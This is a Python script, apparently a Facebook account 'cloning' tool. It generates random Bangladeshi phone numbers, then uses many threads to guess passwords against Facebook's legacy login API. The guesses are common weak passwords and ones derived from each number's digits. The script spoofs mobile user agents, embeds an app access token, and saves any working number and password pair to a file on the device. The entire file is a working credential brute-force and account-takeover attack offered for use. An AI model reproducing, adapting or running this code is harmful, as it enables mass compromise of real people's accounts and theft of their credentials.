import os, sys, re, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#--- [ COLORS ] ---#
G = '\033[1;92m' 
W = '\033[1;97m' 
S = '\033[1;96m'

loop, oks, id = 0, [], []

#--- [ USER AGENTS ] ---#
ua_list = [
    "Mozilla/5.0 (Linux; Android 12; 2201116PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X688B)",
    "Mozilla/5.0 (Linux; Android 8.1.0; ASUS_Z01QD) Chrome/72.0.3626.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Vivo Y91C) Chrome/98.0.4711.185 Mobile Safari/537.36"
]

def logo():
    os.system("clear")
    print(f"""{G}
 ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░▌     ▐░░▌▐░░░░░░░░░░░▌        ▐░▌       ▐░▌▐░░░░░░░░░░░▌
▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀█░▌        ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌        ▐░▌       ▐░▌▐░▌       ▐░▌
▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄█░▌        ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌        ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
{W}━━━━━━━━━━━━━━━━(SHAHIN BIN AHMED)━━━━━━━━━━━━━━━━
{G}[•] OWNER      : SHAHIN BIN AHMED
{G}[•] MODE       : SMART PASSWORD IDENTIFIER
{G}[•] VERSION    : 0.15 (ULTIMATE)
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

#--- [ BD NUMBER GENERATOR ] ---#
def random_number_generator():
    logo()
    print(f" {S}[•] SELECT OPERATOR : {W}017, 018, 019, 013, 015")
    code = input(f" {G}[•] ENTER CODE : {W}")
    limit = int(input(f" {G}[•] HOW MANY NUMBERS? : {W}"))
    for _ in range(limit):
        num = code + str(random.randint(11111111, 99999999))
        id.append(num)
    start_cloning()

#--- [ CLONING START ] ---#
def start_cloning():
    logo()
    total = len(id)
    print(f" {G}[•] TOTAL IDS : {W}{total}")
    print(f" {G}[•] PASS IDENTIFIER : {G}ACTIVE{W}")
    print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    with ThreadPool(max_workers=35) as engine:
        for uid in id:
            #--- [ SMART PASSWORD IDENTIFIER NEW MODE ] ---#
            # আপনার সেই ৪টি গোল্ডেন পাসওয়ার্ড ডিফল্ট থাকবে
            pws = ['123456', '1234567', '12345678', '123456789']
            
            # যদি এটি ১১ ডিজিটের নম্বর হয়, তবে স্মার্টলি পাসওয়ার্ড বানাবে
            if len(uid) == 11:
                pws.append(uid)           # পুরো নম্বর (যেমন: 01711xxxxxx)
                pws.append(uid[-6:])      # শেষ ৬ ডিজিট
                pws.append(uid[-7:])      # শেষ ৭ ডিজিট
                pws.append(uid[-8:])      # শেষ ৮ ডিজিট
                pws.append(uid[:6])       # প্রথম ৬ ডিজিট
                
            # যদি এটি ২০১০ সিরিয়ালের ওল্ড আইডি হয়
            elif uid.startswith('1000016'):
                pws.extend(['102030', '786786', '007007', 'password'])

            engine.submit(crack_engine, uid, pws, total)

def crack_engine(uid, pws, limit):
    global loop, oks
    ua = random.choice(ua_list)
    for pw in pws:
        session = requests.Session()
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(2000000, 30000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        params = {
            'email': uid, 'password': pw,
            'credentials_type': 'password', 'format': 'json',
            'method': 'auth.login', 'api_key': '882a8490361da98702bf97a021ddc14d',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'sig': '62f8ce9f74b12f84c123cc23437a4a32'
        }
        try:
            res = session.post('https://b-api.facebook.com/method/auth.login', data=params, headers=headers).json()
            if 'session_key' in res:
                print(f'\n{G}[SHAHIN-OK] {uid} | {pw}{W}')
                oks.append(uid)
                open('/sdcard/SHAHIN-OK.txt', 'a').write(uid+'|'+pw+'\n')
                break
        except: pass
            
    loop += 1
    sys.stdout.write(f'\r {S}[SHAHIN-M2]-[{loop}/{limit}]-[OK-{len(oks)}] '); sys.stdout.flush()

if __name__ == "__main__":
    logo()
    print(f" {G}[01]{W} NUMBER CLONE (PASS IDENTIFIER)")
    print(f" {G}[00]{W} EXIT")
    opt = input(f" {W}[•] CHOOSE : {G}")
    if opt == "1": random_number_generator()
    else: exit()
